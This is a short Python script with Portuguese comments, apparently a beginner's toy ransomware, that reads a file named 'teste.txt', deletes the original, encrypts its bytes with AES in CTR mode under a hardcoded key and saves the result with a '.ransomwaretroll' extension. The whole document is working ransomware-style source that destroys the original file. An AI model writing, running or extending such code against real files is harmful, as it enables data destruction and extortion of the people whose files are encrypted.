import os 
import pyaes

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#remove o arquivo original
os.remove(file_name)

#chave de criptografia

key = b'1234567890123456'
aes = pyaes.AESModeOfOperationCTR(key)


#criptografa os dados
encrypted_data = aes.encrypt(file_data)

#cria um novo arquivo com os dados criptografados
new_file = 'teste.txt.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(encrypted_data)
new_file.close()
